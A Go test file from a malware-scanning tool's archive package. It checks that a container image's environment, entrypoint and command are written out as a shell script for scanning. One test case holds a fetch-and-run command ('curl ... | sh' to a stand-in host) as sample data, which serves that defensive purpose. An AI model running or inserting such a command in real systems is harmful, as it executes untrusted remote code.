// Copyright 2026 Chainguard, Inc.
// SPDX-License-Identifier: Apache-2.0

package archive

import (
	"fmt"
	"testing"

	v1 "github.com/google/go-containerregistry/pkg/v1"
	"github.com/google/go-containerregistry/pkg/v1/empty"
	"github.com/google/go-containerregistry/pkg/v1/mutate"
)

func TestImageConfigScript(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		in   v1.Config
		want string // empty when no script is written
	}{
		{
			name: "env, entrypoint, and cmd are written one per line",
			in: v1.Config{
				Env:        []string{"PATH=/usr/local/bin:/usr/bin", "MODE=prod", "EMPTY"},
				Entrypoint: []string{"/app/server"},
				Cmd:        []string{"--port", "8080"},
			},
			want: "export PATH=/usr/local/bin:/usr/bin\nexport MODE=prod\nexport EMPTY\n/app/server --port 8080\n",
		},
		{
			name: "a shell -c command is also written as a line of its own",
			in:   v1.Config{Entrypoint: []string{"/bin/sh", "-c"}, Cmd: []string{"curl -s http://example.invalid/x | sh"}},
			want: "/bin/sh -c 'curl -s http://example.invalid/x | sh'\ncurl -s http://example.invalid/x | sh\n",
		},
		{
			name: "a multi-line shell script keeps one command per line",
			in:   v1.Config{Cmd: []string{"/bin/bash", "-ec", "cd /app\n./run"}},
			want: "/bin/bash -ec 'cd /app\n./run'\ncd /app\n./run\n",
		},
		{
			name: "busybox applets are recognized as shells",
			in:   v1.Config{Cmd: []string{"busybox", "sh", "-c", "id"}},
			want: "busybox sh -c id\nid\n",
		},
		{
			name: "arguments with quotes and spaces are quoted for the shell",
			in:   v1.Config{Cmd: []string{"echo", "it's here", ""}},
			want: "echo 'it'\\''s here' ''\n",
		},
		{
			name: "a -c flag that does not follow a shell is an ordinary argument",
			in:   v1.Config{Cmd: []string{"/usr/bin/python3", "-c", "print(1)"}},
			want: "/usr/bin/python3 -c 'print(1)'\n",
		},
		{
			name: "a config without env, entrypoint, or cmd writes no script",
			in:   v1.Config{User: "nobody", WorkingDir: "/app", Labels: map[string]string{"a": "b"}},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got := string(imageConfigScript(tc.in))
			want := ""
			if tc.want != "" {
				want = ociConfigScriptHeader + tc.want
			}
			if got != want {
				t.Errorf("script:\ngot  = %q\nwant = %q", got, want)
			}
		})
	}
}

func TestOCIWithConfig_ImageConfigScript(t *testing.T) {
	t.Parallel()
	config := v1.Config{Entrypoint: []string{"/bin/sh", "-c"}, Cmd: []string{"echo config"}}
	script := "file:" + string(imageConfigScript(config))
	withConfig := func(t *testing.T, img v1.Image) v1.Image {
		t.Helper()
		img, err := mutate.Config(img, config)
		if err != nil {
			t.Fatalf("set config: %v", err)
		}
		return img
	}
	cases := []struct {
		name  string
		build func(t *testing.T) (v1.Image, v1.ImageIndex)
		want  map[string]string
	}{
		{
			name: "the config is written beside the image files",
			build: func(t *testing.T) (v1.Image, v1.ImageIndex) {
				t.Helper()
				return withConfig(t, ociTestImage(t, []ociTestEntry{{name: "app", body: "a"}})), nil
			},
			want: map[string]string{"app": "file:a", ociConfigScriptName: script},
		},
		{
			name: "an image file at the script path wins and the script takes the next free name",
			build: func(t *testing.T) (v1.Image, v1.ImageIndex) {
				t.Helper()
				return withConfig(t, ociTestImage(t, []ociTestEntry{
					{name: ociConfigScriptName, body: "real"},
					{name: "malcontent-image-config.1.sh", body: "real 1"},
				})), nil
			},
			want: map[string]string{
				ociConfigScriptName:            "file:real",
				"malcontent-image-config.1.sh": "file:real 1",
				"malcontent-image-config.2.sh": script,
			},
		},
		{
			name: "an image directory at the script path also wins",
			build: func(t *testing.T) (v1.Image, v1.ImageIndex) {
				t.Helper()
				return withConfig(t, ociTestImage(t, []ociTestEntry{ociDirEntry(ociConfigScriptName + "/")})), nil
			},
			want: map[string]string{ociConfigScriptName: "dir", "malcontent-image-config.1.sh": script},
		},
		{
			name: "each platform gets its own script",
			build: func(t *testing.T) (v1.Image, v1.ImageIndex) {
				t.Helper()
				img := withConfig(t, ociTestImage(t, []ociTestEntry{{name: "app", body: "a"}}))
				return nil, mutate.AppendManifests(empty.Index,
					mutate.IndexAddendum{Add: img, Platform: &v1.Platform{OS: "linux", Architecture: "amd64"}},
					mutate.IndexAddendum{Add: img, Platform: &v1.Platform{OS: "linux", Architecture: "arm64"}},
				)
			},
			want: map[string]string{
				"linux-amd64": "dir", "linux-amd64/app": "file:a", "linux-amd64/" + ociConfigScriptName: script,
				"linux-arm64": "dir", "linux-arm64/app": "file:a", "linux-arm64/" + ociConfigScriptName: script,
			},
		},
		{
			name: "an image without env, entrypoint, or cmd gets no script",
			build: func(t *testing.T) (v1.Image, v1.ImageIndex) {
				t.Helper()
				return ociTestImage(t, []ociTestEntry{{name: "app", body: "a"}}), nil
			},
			want: map[string]string{"app": "file:a"},
		},
	}
	host := ociTestRegistry(t)
	for i, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			ref := fmt.Sprintf("%s/config:case%d", host, i)
			img, idx := tc.build(t)
			if idx != nil {
				ociPushIndex(t, ref, idx)
			} else {
				ociPushImage(t, ref, img)
			}
			dir, err := OCIWithConfig(t.Context(), ref, ociTestConfig(0))
			removeOCIDir(t, dir)
			if err != nil {
				t.Fatalf("OCIWithConfig: %v", err)
			}
			ociAssertTree(t, dir, tc.want)
		})
	}
}
